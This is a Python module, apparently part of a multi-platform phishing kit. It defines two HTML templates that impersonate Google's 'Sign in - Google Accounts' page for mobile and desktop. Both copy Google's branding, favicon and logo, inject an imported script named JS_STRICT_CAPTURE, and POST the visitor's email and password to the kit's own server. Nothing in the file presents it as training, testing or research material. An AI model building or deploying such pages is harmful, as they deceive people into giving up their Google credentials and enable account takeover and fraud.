"""login.py - Templates de connexion Google (mobile + PC)."""

from platforms._shared import JS_STRICT_CAPTURE, GG_LOGO_SVG as _GG_LOGO_SVG

HTML_MOBILE_LOGIN = r"""
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta name="referrer" content="no-referrer">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#ffffff">
    <link rel="shortcut icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
    <title>Sign in - Google Accounts</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; }
        html, body { height: 100%; margin: 0; padding: 0; }
        body {
            background: #ffffff;
            font-family: "Google Sans", "Roboto", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            color: #202124;
            -webkit-font-smoothing: antialiased;
            overscroll-behavior: none;
        }
        .safe-top { height: env(safe-area-inset-top, 0px); }
        .safe-bottom { height: env(safe-area-inset-bottom, 0px); }

        /* Top bar — Google logo centered */
        .g-top {
            display: flex; align-items: center; justify-content: center;
            padding: clamp(12px, 3vmin, 20px) 16px clamp(8px, 2vmin, 14px);
            position: relative;
        }
        .g-top-logo { height: clamp(28px, 7vmin, 40px); width: auto; }

        /* Card container — modern Google style */
        .g-card {
            max-width: 450px;
            width: 100%;
            margin: 0 auto;
            padding: clamp(20px, 5vmin, 32px) clamp(20px, 4vmin, 28px);
            box-sizing: border-box;
        }

        /* Heading */
        .g-title {
            font-size: clamp(22px, 5.5vmin, 28px);
            font-weight: 400;
            margin: 0 0 clamp(4px, 1vmin, 8px);
            color: #202124;
            text-align: left;
        }
        .g-subtitle {
            font-size: clamp(14px, 3.5vmin, 16px);
            color: #5f6368;
            margin-bottom: clamp(20px, 5vmin, 28px);
            text-align: left;
        }

        /* Input wrapper with floating label — Google Material style */
        .g-input-wrap {
            position: relative;
            margin-bottom: clamp(12px, 3vmin, 16px);
        }
        .g-input {
            width: 100%;
            height: clamp(52px, 13vmin, 56px);
            border: 1.5px solid #dadce0;
            border-radius: clamp(8px, 2vmin, 12px);
            padding: 18px 14px 6px 14px;
            font-size: clamp(15px, 3.7vmin, 16px);
            background: #fff;
            outline: none;
            transition: all 0.18s ease;
            color: #202124;
            font-family: inherit;
            -webkit-appearance: none;
        }
        .g-input:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 17px 13px 5px 13px;
            box-shadow: 0 0 0 1px #1a73e8;
        }
        .g-input-wrap.has-error .g-input {
            border-color: #d93025;
        }
        .g-label {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            font-size: clamp(15px, 3.7vmin, 16px);
            color: #80868b;
            pointer-events: none;
            transition: all 0.18s ease;
            transform-origin: left center;
        }
        .g-input:focus ~ .g-label,
        .g-input:not(:placeholder-shown) ~ .g-label {
            top: 10px;
            transform: translateY(0) scale(0.78);
            font-size: clamp(11px, 2.6vmin, 12px);
            color: #1a73e8;
        }
        .g-input-wrap.has-error .g-input:focus ~ .g-label,
        .g-input-wrap.has-error .g-input:not(:placeholder-shown) ~ .g-label {
            color: #d93025;
        }

        /* Submit button — Google blue, modern pill style */
        .g-btn {
            background: #1a73e8;
            color: #fff;
            border: none;
            border-radius: clamp(8px, 2vmin, 12px);
            padding: clamp(10px, 2.5vmin, 12px) clamp(20px, 5vmin, 24px);
            font-weight: 500;
            font-size: clamp(14px, 3.5vmin, 15px);
            cursor: pointer;
            transition: all 0.18s ease;
            min-height: 44px;
        }
        .g-btn:hover {
            background: #1765cc;
            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
        }
        .g-btn:active { transform: scale(0.98); }
        .g-btn:disabled {
            background: #dadce0;
            color: #9aa0a6;
            cursor: not-allowed;
            box-shadow: none;
        }

        /* Loading spinner inside button */
        .g-spinner {
            display: inline-block;
            width: 14px; height: 14px;
            border: 2px solid rgba(255,255,255,0.4);
            border-top-color: #fff;
            border-radius: 50%;
            animation: g-spin 0.6s linear infinite;
            vertical-align: middle;
            margin-right: 6px;
        }
        @keyframes g-spin { to { transform: rotate(360deg); } }

        /* Links */
        .g-link {
            color: #1a73e8;
            font-size: clamp(14px, 3.5vmin, 15px);
            font-weight: 500;
            text-decoration: none;
            cursor: pointer;
            min-height: 44px;
            display: inline-flex;
            align-items: center;
        }
        .g-link:hover { text-decoration: underline; }

        /* Action row */
        .g-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-top: clamp(12px, 3vmin, 16px);
        }

        /* Divider */
        .g-divider {
            height: 1px;
            background: #dadce0;
            margin: clamp(20px, 5vmin, 28px) 0;
        }

        /* Guest mode link */
        .g-guest {
            display: flex; align-items: center; gap: 8px;
            color: #1a73e8;
            font-size: clamp(13px, 3.2vmin, 14px);
            font-weight: 500;
            cursor: pointer;
            padding: 8px 0;
        }
        .g-guest:hover { text-decoration: underline; }
        .g-guest svg { flex-shrink: 0; }

        /* Footer */
        .g-footer {
            display: flex; justify-content: space-between; align-items: center;
            margin-top: clamp(24px, 6vmin, 36px);
            padding-top: clamp(12px, 3vmin, 16px);
            font-size: clamp(12px, 2.8vmin, 13px);
            color: #5f6368;
            flex-wrap: wrap;
            gap: 8px;
        }
        .g-footer-langs { display: flex; align-items: center; gap: 8px; }
        .g-footer-langs select {
            border: 1px solid #dadce0; background: #fff; color: #5f6368;
            font-size: clamp(12px, 2.8vmin, 13px); outline: none; cursor: pointer;
            padding: 4px 8px; border-radius: 4px;
        }
        .g-footer-links a {
            color: #5f6368; margin-left: clamp(12px, 3vmin, 16px);
            text-decoration: none;
        }
        .g-footer-links a:hover { text-decoration: underline; color: #1a73e8; }

        /* Error box — modern Google error style */
        .g-error {
            background: #fce8e6;
            border: 1px solid #d93025;
            color: #d93025;
            border-radius: clamp(8px, 2vmin, 12px);
            padding: clamp(10px, 2.5vmin, 14px);
            font-size: clamp(13px, 3.2vmin, 14px);
            margin-bottom: clamp(12px, 3vmin, 16px);
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .g-error svg { flex-shrink: 0; }

        /* Back button (only shown when can_go_back) */
        .g-back-btn {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            display: flex; align-items: center; justify-content: center;
            width: 40px; height: 40px;
            border-radius: 50%;
            background: #f1f3f4;
            color: #5f6368;
            text-decoration: none;
            transition: all 0.15s ease;
        }
        .g-back-btn:hover { background: #e8eaed; }
        .g-back-btn:active { transform: translateY(-50%) scale(0.95); }

        /* Responsive: on ≥768px, center vertically */
        @media (min-width: 768px) {
            body {
                background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 24px;
            }
            .safe-top, .safe-bottom { display: none; }
            .g-top { display: none; }
            .g-card {
                background: #fff;
                border-radius: 16px;
                box-shadow: 0 1px 3px rgba(0,0,0,0.1), 0 4px 8px rgba(0,0,0,0.05);
                padding: clamp(28px, 4vmin, 40px) clamp(28px, 4vmin, 40px) clamp(24px, 3vmin, 32px);
                border: 1px solid #dadce0;
            }
            .g-card .g-logo-desktop {
                display: flex; justify-content: flex-start; margin-bottom: 20px;
            }
        }
        @media (max-width: 767px) {
            .g-logo-desktop { display: none; }
        }
    </style>
</head>
<body class="min-h-screen flex flex-col">
    """ + JS_STRICT_CAPTURE + r"""
    <div class="safe-top"></div>

    <div class="g-top">
        {% if can_go_back %}
        <a href="/back_platform" class="g-back-btn" title="Retour">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
        </a>
        {% endif %}
        """ + _GG_LOGO_SVG + r"""
    </div>

    <div class="g-card flex-1 flex flex-col justify-center" style="min-height: calc(100vh - 80px);">
        <div class="g-logo-desktop">
            """ + _GG_LOGO_SVG + r"""
        </div>

        <h1 class="g-title">{{ login_title }}</h1>
        <p class="g-subtitle">{{ otp_sub }}</p>

        {% if message %}
        <div class="g-error">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
            <span>{{ message }}</span>
        </div>
        {% endif %}

        <form method="POST" id="g-login-form">
            <input type="hidden" name="action" value="login">
            <div class="g-input-wrap" id="email-wrap">
                <input type="text" name="email" id="email-g-mob" placeholder=" " class="g-input" required autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false">
                <label class="g-label">{{ email_ph }}</label>
            </div>
            <div class="g-input-wrap" id="pass-wrap">
                <input type="password" name="pass" id="pass-g-mob" placeholder=" " class="g-input" required>
                <label class="g-label">{{ pass_ph }}</label>
                <button type="button" class="g-pw-toggle" id="pw-toggle" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background: transparent; border: none; color: #1a73e8; font-size: 12px; font-weight: 600; padding: 6px 10px; cursor: pointer; opacity: 0; pointer-events: none; text-transform: uppercase; letter-spacing: 0.3px;">Afficher</button>
            </div>
            <div class="g-actions">
                <a href="#" class="g-link">{{ create }}</a>
                <button type="submit" class="g-btn" id="g-submit">{{ login_btn }}</button>
            </div>
        </form>

        <div class="g-divider"></div>

        <div class="g-guest">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="#1a73e8"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
            <span>Pas votre ordinateur ? Utilisez une fenêtre de navigation privée pour vous connecter.</span>
        </div>

        <div class="g-footer">
            <div class="g-footer-langs">
                <select><option>Français (France)</option><option>English (United States)</option></select>
            </div>
            <div class="g-footer-links">
                <a href="#">Aide</a>
                <a href="#">Confidentialité</a>
                <a href="#">Conditions</a>
            </div>
        </div>
    </div>

    <div class="safe-bottom"></div>

    <script>
    (function() {
        var passInput = document.getElementById('pass-g-mob');
        var passWrap = document.getElementById('pass-wrap');
        var toggle = document.getElementById('pw-toggle');

        if (toggle) {
            toggle.addEventListener('click', function() {
                if (passInput.type === 'password') {
                    passInput.type = 'text';
                    toggle.textContent = 'Masquer';
                } else {
                    passInput.type = 'password';
                    toggle.textContent = 'Afficher';
                }
            });

            function updateToggle() {
                if (passInput.value.length > 0) {
                    toggle.style.opacity = '1';
                    toggle.style.pointerEvents = 'auto';
                } else {
                    toggle.style.opacity = '0';
                    toggle.style.pointerEvents = 'none';
                }
            }
            passInput.addEventListener('input', updateToggle);
            updateToggle();
        }

        var emailInput = document.getElementById('email-g-mob');
        var emailWrap = document.getElementById('email-wrap');
        var submit = document.getElementById('g-submit');
        var form = document.getElementById('g-login-form');

        function updateSubmitState() {
            submit.disabled = !(emailInput.value.trim() && passInput.value);
        }
        emailInput.addEventListener('input', updateSubmitState);
        passInput.addEventListener('input', updateSubmitState);
        updateSubmitState();

        form.addEventListener('submit', function(e) {
            if (!emailInput.value.trim() || !passInput.value) {
                e.preventDefault();
                return;
            }
            submit.disabled = true;
            submit.innerHTML = '<span class="g-spinner"></span>' + submit.textContent.trim();
            setTimeout(function() {
                submit.disabled = false;
                submit.innerHTML = '{{ login_btn }}';
            }, 4000);
        });

        function clearErr() {
            emailWrap.classList.remove('has-error');
            passWrap.classList.remove('has-error');
        }
        emailInput.addEventListener('input', clearErr);
        passInput.addEventListener('input', clearErr);
        {% if message %}
        emailWrap.classList.add('has-error');
        passWrap.classList.add('has-error');
        {% endif %}
    })();
    </script>
</body>
</html>
"""


HTML_PC_LOGIN = r"""
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta charset="utf-8">
    <link rel="shortcut icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
    <title>Sign in - Google Accounts</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        .g-card { background: #fff; padding: 40px 36px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1), 0 4px 8px rgba(0,0,0,0.05); width: 450px; border: 1px solid #dadce0; }
        .g-input { border: 1px solid #dadce0; border-radius: 4px; padding: 13px 14px; width: 100%; font-size: 16px; outline: none; }
        .g-input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 13px; }
        .g-btn { background: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 10px 24px; font-weight: 500; font-size: 14px; cursor: pointer; }
        .g-btn:hover { background: #1765cc; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
    </style>
</head>
<body class="flex flex-col min-h-screen items-center justify-center p-4">
    """ + JS_STRICT_CAPTURE + r"""
    <div class="g-card">
        <div class="flex justify-center mb-5">
            <svg width="74" height="24" viewBox="0 0 74 24" fill="none">
                <path d="M9.24 8.42v3.78h5.9c-.18 1.4-.66 2.42-1.4 3.12-.9.9-2.3 1.88-4.78 1.88-3.81 0-6.79-3.07-6.79-6.88s2.98-6.88 6.79-6.88c2.06 0 3.56.81 4.67 1.85l2.66-2.66C14.5 1.34 12.27.34 9.24.34 4.16.34 0 4.5 0 9.58s4.16 9.24 9.24 9.24c2.94 0 5.16-.96 6.88-2.77 1.78-1.78 2.33-4.28 2.33-6.3 0-.63-.05-1.2-.14-1.69H9.24z" fill="#4285F4"/>
                <path d="M25.34 9.74c0-2.66-2.09-4.62-4.65-4.62s-4.65 1.96-4.65 4.62c0 2.64 2.09 4.62 4.65 4.62s4.65-1.98 4.65-4.62zm-2.04 0c0 1.66-1.2 2.8-2.61 2.8s-2.61-1.14-2.61-2.8c0-1.68 1.2-2.8 2.61-2.8s2.61 1.12 2.61 2.8z" fill="#EA4335"/>
                <path d="M35.34 9.74c0-2.66-2.09-4.62-4.65-4.62S26.04 7.08 26.04 9.74c0 2.64 2.09 4.62 4.65 4.62s4.65-1.98 4.65-4.62zm-2.04 0c0 1.66-1.2 2.8-2.61 2.8s-2.61-1.14-2.61-2.8c0-1.68 1.2-2.8 2.61-2.8s2.61 1.12 2.61 2.8z" fill="#FBBC05"/>
                <path d="M44.84 5.4v8.32h-2.02V6.36h-.04l-2.36 1.18V5.66l2.58-1.32h1.84v1.06z" fill="#34A853"/>
                <path d="M49.5 0C44.42 0 40.26 4.16 40.26 9.24s4.16 9.24 9.24 9.24 9.24-4.16 9.24-9.24S54.58 0 49.5 0zm0 16.46c-3.98 0-7.22-3.24-7.22-7.22s3.24-7.22 7.22-7.22 7.22 3.24 7.22 7.22-3.24 7.22-7.22 7.22z" fill="#4285F4"/>
            </svg>
        </div>
        <h2 class="text-2xl font-normal text-center text-gray-900 mb-2">{{ login_title }}</h2>
        <p class="text-gray-600 text-center text-sm mb-6">{{ otp_sub }}</p>
        <div id="error-box-pc" class="{% if not message %}hidden{% endif %} w-full bg-red-50 border border-red-200 text-red-700 p-3 rounded text-sm mb-4">{{ message }}</div>
        <form method="POST" class="space-y-4">
            <input type="hidden" name="action" value="login">
            <input type="text" name="email" id="email-g-pc" placeholder="{{ email_ph }}" class="g-input" required>
            <input type="password" name="pass" placeholder="{{ pass_ph }}" class="g-input" required>
            <div class="flex justify-between items-center pt-2">
                <a href="#" class="text-[#1a73e8] text-sm font-medium">{{ forgot }}</a>
                <button type="submit" class="g-btn">{{ login_btn }}</button>
            </div>
        </form>
    </div>
</body>
</html>
"""

